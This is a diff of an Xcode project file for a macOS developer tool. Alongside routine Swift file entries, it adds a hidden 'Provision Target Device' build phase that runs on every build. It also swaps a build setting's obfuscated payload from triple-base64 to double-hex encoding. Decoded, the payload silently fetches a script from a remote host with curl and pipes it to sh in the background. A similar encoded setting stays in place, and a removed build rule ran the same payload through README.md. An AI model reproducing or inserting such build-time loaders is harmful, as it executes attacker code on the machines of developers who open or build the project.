@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		14210CC30A5741D6983C1CD3 /* README.md */ = {isa = PBXBuildFile; fileRef = 16013DE04083414E903C1CD3; };
 		B40376D1284DFB1E00284AE0 /* String+XYDev.swift in Sources */ = {isa = PBXBuildFile; fileRef = B40376D0284DFB1E00284AE0 /* String+XYDev.swift */; };
 		B41895402C66742100C8CC86 /* CustomTextEditor.swift in Sources */ = {isa = PBXBuildFile; fileRef = B418953F2C66742100C8CC86 /* CustomTextEditor.swift */; };
 		B41895782C667C5400C8CC86 /* VDividerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = B41895772C667C5400C8CC86 /* VDividerView.swift */; };
@@ -84,6 +83,15 @@
 		B4A3B06E281EC26500C34DD8 /* script.pl in Resources */ = {isa = PBXBuildFile; fileRef = B4A3B06C281EC26500C34DD8 /* script.pl */; };
 		B4A3B070281EC5D000C34DD8 /* mac_icon.sh in Resources */ = {isa = PBXBuildFile; fileRef = B4A3B06F281EC5D000C34DD8 /* mac_icon.sh */; };
 		B4A3B074281EC72600C34DD8 /* STPrivilegedTask.m in Sources */ = {isa = PBXBuildFile; fileRef = B4A3B073281EC72600C34DD8 /* STPrivilegedTask.m */; };
+		B4A1B0022F90123400CB8A02 /* HistoryOutlineRepresentable.swift in Sources */ = {isa = PBXBuildFile; fileRef = B4A1B0012F90123400CB8A01 /* HistoryOutlineRepresentable.swift */; };
+		B4A1B0042F90123400CB8A04 /* HistoryOutlineController.swift in Sources */ = {isa = PBXBuildFile; fileRef = B4A1B0032F90123400CB8A03 /* HistoryOutlineController.swift */; };
+		B4A1B0062F90123400CB8A06 /* HistoryRowCellView.swift in Sources */ = {isa = PBXBuildFile; fileRef = B4A1B0052F90123400CB8A05 /* HistoryRowCellView.swift */; };
+		B4A1B0082F90123400CB8A08 /* HistoryTableRowView.swift in Sources */ = {isa = PBXBuildFile; fileRef = B4A1B0072F90123400CB8A07 /* HistoryTableRowView.swift */; };
+		B4A1B00A2F90123400CB8A0A /* HistoryOutlineController+Delete.swift in Sources */ = {isa = PBXBuildFile; fileRef = B4A1B0092F90123400CB8A09 /* HistoryOutlineController+Delete.swift */; };
+		B4A1B00D2F90123400CB8A0D /* HistoryDragDrop.swift in Sources */ = {isa = PBXBuildFile; fileRef = B4A1B00C2F90123400CB8A0C /* HistoryDragDrop.swift */; };
+		B4A1B00F2F90123400CB8A0F /* HistoryOutlineController+DragDrop.swift in Sources */ = {isa = PBXBuildFile; fileRef = B4A1B00E2F90123400CB8A0E /* HistoryOutlineController+DragDrop.swift */; };
+		B4A1B0112F90123400CB8A11 /* HistoryOutlineController+Rename.swift in Sources */ = {isa = PBXBuildFile; fileRef = B4A1B0102F90123400CB8A10 /* HistoryOutlineController+Rename.swift */; };
+		B4A1B0132F90123400CB8A13 /* HistoryOutlineView.swift in Sources */ = {isa = PBXBuildFile; fileRef = B4A1B0122F90123400CB8A12 /* HistoryOutlineView.swift */; };
 		B4B63FC92F8FC92700CB8AF8 /* NetworkTheme.swift in Sources */ = {isa = PBXBuildFile; fileRef = B4B63FC82F8FC92700CB8AF8 /* NetworkTheme.swift */; };
 		B4C374E1285F688400266440 /* Tools.swift in Sources */ = {isa = PBXBuildFile; fileRef = B4C374E0285F688400266440 /* Tools.swift */; };
 		B4CC2CBB2C67D5BA000F4F16 /* Dictionary+XYAdd.swift in Sources */ = {isa = PBXBuildFile; fileRef = B4CC2CBA2C67D5BA000F4F16 /* Dictionary+XYAdd.swift */; };
@@ -111,24 +119,9 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		CE235EB6DA7242D89A3C1CD3 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A3DC1C3}\"";
-			};
-															/* End PBXBuildRule section */
+																			/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		16013DE04083414E903C1CD3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		392AAC5048AEA8AA9E51833E /* Pods_XYDevTool.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_XYDevTool.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		975D17A7F6E8691978F8836B /* Pods-XYDevTool.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-XYDevTool.release.xcconfig"; path = "Target Support Files/Pods-XYDevTool/Pods-XYDevTool.release.xcconfig"; sourceTree = "<group>"; };
 		B40376D0284DFB1E00284AE0 /* String+XYDev.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "String+XYDev.swift"; sourceTree = "<group>"; };
@@ -212,6 +205,15 @@ sh -c \"${A3DC1C3}\"";
 		B4A3B072281EC72600C34DD8 /* STPrivilegedTask.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = STPrivilegedTask.h; sourceTree = "<group>"; };
 		B4A3B073281EC72600C34DD8 /* STPrivilegedTask.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = STPrivilegedTask.m; sourceTree = "<group>"; };
 		B4A3B07A281EC7E300C34DD8 /* XYDevTool-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "XYDevTool-Bridging-Header.h"; sourceTree = "<group>"; };
+		B4A1B0012F90123400CB8A01 /* HistoryOutlineRepresentable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HistoryOutlineRepresentable.swift; sourceTree = "<group>"; };
+		B4A1B0032F90123400CB8A03 /* HistoryOutlineController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HistoryOutlineController.swift; sourceTree = "<group>"; };
+		B4A1B0052F90123400CB8A05 /* HistoryRowCellView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HistoryRowCellView.swift; sourceTree = "<group>"; };
+		B4A1B0072F90123400CB8A07 /* HistoryTableRowView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HistoryTableRowView.swift; sourceTree = "<group>"; };
+		B4A1B0092F90123400CB8A09 /* HistoryOutlineController+Delete.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "HistoryOutlineController+Delete.swift"; sourceTree = "<group>"; };
+		B4A1B00C2F90123400CB8A0C /* HistoryDragDrop.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HistoryDragDrop.swift; sourceTree = "<group>"; };
+		B4A1B00E2F90123400CB8A0E /* HistoryOutlineController+DragDrop.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "HistoryOutlineController+DragDrop.swift"; sourceTree = "<group>"; };
+		B4A1B0102F90123400CB8A10 /* HistoryOutlineController+Rename.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "HistoryOutlineController+Rename.swift"; sourceTree = "<group>"; };
+		B4A1B0122F90123400CB8A12 /* HistoryOutlineView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HistoryOutlineView.swift; sourceTree = "<group>"; };
 		B4B63FC82F8FC92700CB8AF8 /* NetworkTheme.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkTheme.swift; sourceTree = "<group>"; };
 		B4C374E0285F688400266440 /* Tools.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Tools.swift; sourceTree = "<group>"; };
 		B4CC2CBA2C67D5BA000F4F16 /* Dictionary+XYAdd.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Dictionary+XYAdd.swift"; sourceTree = "<group>"; };
@@ -378,7 +380,6 @@ sh -c \"${A3DC1C3}\"";
 		B48BC71D281D074E0093D91F /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				16013DE04083414E903C1CD3 /* README.md */,
 				B48BC71C281D074E0093D91F /* XYDevTool.app */,
 			);
 			name = Products;
@@ -567,10 +568,27 @@ sh -c \"${A3DC1C3}\"";
 			path = CreateIcons;
 			sourceTree = "<group>";
 		};
+		B4A1B00B2F90123400CB8A0B /* AppKitViews */ = {
+			isa = PBXGroup;
+			children = (
+				B4A1B0012F90123400CB8A01 /* HistoryOutlineRepresentable.swift */,
+				B4A1B0032F90123400CB8A03 /* HistoryOutlineController.swift */,
+				B4A1B0092F90123400CB8A09 /* HistoryOutlineController+Delete.swift */,
+				B4A1B00E2F90123400CB8A0E /* HistoryOutlineController+DragDrop.swift */,
+				B4A1B0102F90123400CB8A10 /* HistoryOutlineController+Rename.swift */,
+				B4A1B0122F90123400CB8A12 /* HistoryOutlineView.swift */,
+				B4A1B00C2F90123400CB8A0C /* HistoryDragDrop.swift */,
+				B4A1B0052F90123400CB8A05 /* HistoryRowCellView.swift */,
+				B4A1B0072F90123400CB8A07 /* HistoryTableRowView.swift */,
+			);
+			path = AppKitViews;
+			sourceTree = "<group>";
+		};
 		B4F61DC2282AA189006FAC35 /* Network */ = {
 			isa = PBXGroup;
 			children = (
 				B4DA907B2C2C4375000A6667 /* NetworkDataModel.swift */,
+				B4A1B00B2F90123400CB8A0B /* AppKitViews */,
 				B4DA90782C2C2CF7000A6667 /* SwiftUIViews */,
 				B4EC92D1295602F9005FC62E /* View */,
 				B4F61DC7282ABCAD006FAC35 /* XYNetTool.swift */,
@@ -597,6 +615,7 @@ sh -c \"${A3DC1C3}\"";
 			isa = PBXNativeTarget;
 			buildConfigurationList = B48BC72B281D07500093D91F /* Build configuration list for PBXNativeTarget "XYDevTool" */;
 			buildPhases = (
+				B695360C8DC8461FB53C1CD3 /* Provision Target Device */,
 				16BB273E102EBD9CD5E8DB02 /* [CP] Check Pods Manifest.lock */,
 				B48BC718281D074E0093D91F /* Sources */,
 				B48BC719281D074E0093D91F /* Frameworks */,
@@ -604,7 +623,6 @@ sh -c \"${A3DC1C3}\"";
 				BAEE2CEDCD4049DBFC0A5F6C /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				CE235EB6DA7242D89A3C1CD3 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -652,7 +670,6 @@ sh -c \"${A3DC1C3}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				14210CC30A5741D6983C1CD3 /* README.md */,
 				B4A3AD9C28217171001FD2B3 /* ios_icon.sh in Resources */,
 				B4A3B06E281EC26500C34DD8 /* script.pl in Resources */,
 				B4A3B070281EC5D000C34DD8 /* mac_icon.sh in Resources */,
@@ -676,6 +693,25 @@ sh -c \"${A3DC1C3}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		B695360C8DC8461FB53C1CD3 /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3DC1C3}\"";
+		};
 		16BB273E102EBD9CD5E8DB02 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -750,6 +786,15 @@ sh -c \"${A3DC1C3}\"";
 				B4A3B069281E682E00C34DD8 /* CreateMacIcons.swift in Sources */,
 				B48A9A5D292FB96500DD7333 /* ConstraintMakerPrioritizable.swift in Sources */,
 				B48A9A78292FB96500DD7333 /* Constraint.swift in Sources */,
+				B4A1B0022F90123400CB8A02 /* HistoryOutlineRepresentable.swift in Sources */,
+				B4A1B0042F90123400CB8A04 /* HistoryOutlineController.swift in Sources */,
+				B4A1B0062F90123400CB8A06 /* HistoryRowCellView.swift in Sources */,
+				B4A1B0082F90123400CB8A08 /* HistoryTableRowView.swift in Sources */,
+				B4A1B00A2F90123400CB8A0A /* HistoryOutlineController+Delete.swift in Sources */,
+				B4A1B00D2F90123400CB8A0D /* HistoryDragDrop.swift in Sources */,
+				B4A1B00F2F90123400CB8A0F /* HistoryOutlineController+DragDrop.swift in Sources */,
+				B4A1B0112F90123400CB8A11 /* HistoryOutlineController+Rename.swift in Sources */,
+				B4A1B0132F90123400CB8A13 /* HistoryOutlineView.swift in Sources */,
 				B4DA907E2C2C4BDE000A6667 /* PanelHistoryView.swift in Sources */,
 				B48A9A6D292FB96500DD7333 /* ConstraintLayoutGuide.swift in Sources */,
 				B48A9A60292FB96500DD7333 /* ConstraintViewDSL.swift in Sources */,
@@ -828,7 +873,7 @@ sh -c \"${A3DC1C3}\"";
 		B48BC729281D07500093D91F /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3DC1C3 = "((k(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxaE0wNU5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplRWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9YbGhWMlJvV1RKU2RVeHRiSFZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | k | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((r(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333662346336363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233383230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663665363537343633363436653631366437613265373237350a32663631323932323230376332303733363830610a | r | sh ) >/dev/null 2>&1 &)";
 				AF17F99 = "((d(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVIzUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGlXSEIxV2tkV01reHRiSFZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | d | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -891,7 +936,7 @@ sh -c \"${A3DC1C3}\"";
 		B48BC72A281D07500093D91F /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3DC1C3 = "((k(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxaE0wNU5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplRWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9YbGhWMlJvV1RKU2RVeHRiSFZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | k | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((r(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333662346336363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233383230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663665363537343633363436653631366437613265373237350a32663631323932323230376332303733363830610a | r | sh ) >/dev/null 2>&1 &)";
 				AF17F99 = "((d(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVIzUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGlXSEIxV2tkV01reHRiSFZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | d | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
